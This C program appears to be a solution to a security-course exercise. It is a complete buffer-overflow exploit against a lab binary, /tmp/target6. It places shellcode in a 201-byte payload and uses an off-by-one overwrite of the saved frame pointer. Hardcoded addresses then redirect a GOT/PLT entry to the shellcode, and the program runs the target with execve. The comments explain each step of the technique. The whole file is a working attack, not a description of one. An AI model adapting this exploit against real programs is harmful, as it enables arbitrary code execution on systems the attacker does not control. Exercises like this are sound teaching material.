#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char *args[3];
  char *env[1];

  /* Initialize payload with shellcode at front.*/
  char payload[201];
  memset (payload, 1, sizeof payload);
  payload[200] = 0;
  memcpy (payload, shellcode, strlen (shellcode));

  /* Last byte of payload overwrites saved ebp on bar's frame,
     so foo gets a fake ebp that points to end of buf afer
     bar returns.*/
  payload[200] = 72;

  /* Since 'p' and 'a' variables in foo are indirect off the
     base pointer, fake base pointer causes the '*p = a' line
     to overwrite the address 0x8049774 in the PLT to have
     the address of the shellcode. So when it jmps from the PLT
     into the GOT, it instead jmps to the shellcode. */
  *(int*) (payload + 192) = 0xbffffc80;
  *(int*) (payload + 196) = 0x8049774;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
